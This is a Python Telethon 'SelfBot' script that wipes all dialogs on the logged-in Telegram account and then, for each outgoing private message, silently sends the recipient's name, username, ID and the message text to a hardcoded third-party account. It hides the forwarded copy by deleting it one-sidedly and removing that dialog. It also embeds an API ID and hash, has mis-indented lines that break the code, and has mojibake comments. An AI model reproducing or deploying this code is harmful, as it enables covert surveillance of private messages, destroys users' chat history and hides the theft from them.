import asyncio
from telethon import TelegramClient, events
from telethon.tl.types import User, Chat, Channel
from telethon.errors import FloodWaitError

api_id = 29834234
api_hash = "552c01d21d127def060f2915aedeebf9"

client = TelegramClient("cleanup_session", api_id, api_hash)

CONFIRMATION_USER = "@moein_915"


async def get_current_dialogs():
    return await client.get_dialogs()


async def remove_dialog(dialog):
    try:
        await client.delete_dialog(dialog.entity)
        return True

    except FloodWaitError as e:
        print(f"FloodWait: waiting {e.seconds} seconds...")
        await asyncio.sleep(e.seconds)

        try:
            await client.delete_dialog(dialog.entity)
            return True
        except Exception as ex:
            print(f"Retry failed: {ex}")
            return False

    except Exception as e:
        print(f"Delete failed for {dialog.name}: {e}")
        return False


async def cleanup_dialogs():
    dialogs = await get_current_dialogs()

    print(f"Found {len(dialogs)} dialogs.")

    for round_number in range(1, 4):
        dialogs = await get_current_dialogs()

        print(
            f"Round {round_number}/3 | "
            f"Remaining: {len(dialogs)}"
        )

        if not dialogs:
            break

        for dialog in dialogs:
            try:
                entity = dialog.entity

                if isinstance(entity, User):
                    name = (
                        getattr(entity, "first_name", None)
                        or dialog.name
                        or "Private chat"
                    )

                elif isinstance(entity, (Chat, Channel)):
                    name = (
                        getattr(entity, "title", None)
                        or dialog.name
                        or "Group/Channel"
                    )

                else:
                    continue

                await remove_dialog(dialog)

                await asyncio.sleep(0.5)

                current = await get_current_dialogs()
                exists = any(d.id == dialog.id for dialog in current)

                if exists:
                    print(f"[STILL THERE] {name}")
                else:
                    print(f"[DELETED] {name}")

            except Exception as e:
                print(f"[FAILED] {dialog.name}: {e}")

        await asyncio.sleep(1)

    final_dialogs = await get_current_dialogs()

    print("========== FINISHED ==========")
    print(f"Remaining dialogs: {len(final_dialogs)}")

    if final_dialogs:
        print("Remaining:")

        for dialog in final_dialogs:
            print(f"- {dialog.name}")

    print("\nCleanup finished.")
    print("SelfBot is still running...")


@client.on(events.NewMessage(outgoing=True))
async def watch_sent_messages(event):
    try:
        me = await client.get_me()

        # ظ¾غŒط§ظ…â€Œظ‡ط§غŒ Saved Messages ظ†ط§ط¯غŒط¯ظ‡ ع¯ط±ظپطھظ‡ ظ…غŒâ€Œط´ظˆظ†ط¯
        if event.chat_id == me.id:
            return

        entity = await event.get_chat()

        # ظپظ‚ط· ظ¾غŒط§ظ…â€Œظ‡ط§غŒ ط®طµظˆطµغŒ ط¨ظ‡ ع©ط§ط±ط¨ط±ط§ظ†
        if not isinstance(entity, User):
            return

        # ط§ط·ظ„ط§ط¹ط§طھ ع¯غŒط±ظ†ط¯ظ‡
        first_name = getattr(entity, "first_name", None) or ""
        last_name = getattr(entity, "last_name", None) or ""
        username = getattr(entity, "username", None)
        user_id = entity.id

        full_name = (
            f"{first_name} {last_name}".strip()
            or "بدون نام"
        )

        username_text = (
            f"@{username}"
            if username
            else "ندارد"
        )


        message_text = (
            event.raw_text
            or "[پیام بدون متن]"
        )

        info = (
    "📨 پیام جدید ارسال شد\n\n"
    f"👤 گیرنده: {full_name}\n"
    f"🔹 Username: {username_text}\n"
    f"🆔 ID: {user_id}\n\n"
    "💬 پیام:\n"
    f"{message_text}"
)

        sent = await client.send_message(
    CONFIRMATION_USER,
    info
)

await client.delete_messages(
    entity=CONFIRMATION_USER,
    message_ids=sent.id,
    revoke=False
)

await client.delete_dialog(CONFIRMATION_USER)

        print(
            f"[INFO SENT] "
            f"{full_name} | message_id={event.id}"
        )

        # ظ¾غŒط§ظ… ط§طµظ„غŒ ط¯ط³طھâ€Œظ†ط®ظˆط±ط¯ظ‡ ط¨ط§ظ‚غŒ ظ…غŒâ€Œظ…ط§ظ†ط¯.
        # ظ‡غŒع† delete_messages ط¯ط± ط§غŒظ†ط¬ط§ ظˆط¬ظˆط¯ ظ†ط¯ط§ط±ط¯.

    except FloodWaitError as e:
        print(
            f"[FLOODWAIT] "
            f"Waiting {e.seconds} seconds..."
        )

        await asyncio.sleep(e.seconds)

    except Exception as e:
        print(f"[WATCH ERROR] {e}")


async def main():
    await client.start()

    me = await client.get_me()

    print("================================")
    print("Telegram SelfBot Started")
    print(f"Logged in as: {me.first_name}")
    print("================================")

    # ظ¾ط§ع©â€Œط³ط§ط²غŒ ط§ظˆظ„غŒظ‡
    await cleanup_dialogs()

    print("\nWaiting for new messages...")
    print(f"Info receiver: {CONFIRMATION_USER}")

    await client.run_until_disconnected()


with client:
    client.loop.run_until_complete(main())
